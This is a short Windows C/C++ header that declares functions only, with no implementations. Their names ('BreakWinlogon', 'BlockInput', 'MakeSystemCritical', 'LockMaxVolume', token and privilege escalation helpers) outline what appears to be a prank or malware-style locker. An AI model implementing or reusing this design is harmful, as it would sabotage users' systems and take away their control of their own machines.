#pragma once
#include <Windows.h>

void AdjustPrivilege(LPCWSTR privilege, BOOL enabled);

DWORD GetWinLogonPID();

BOOL IsAdmin();
void RelaunchAsAdmin();

BOOL HasUIAccess();
HANDLE CreateUIAccessToken();
void RelaunchWithUIAccess();

BOOL IsInteractive();
HANDLE CreateInteractiveToken();
void RestartInteractively();

void BreakWinlogon();

void BlockInput();

void MakeSystemCritical();

void LockMaxVolume();

void InteractProcess();
void InteractThread();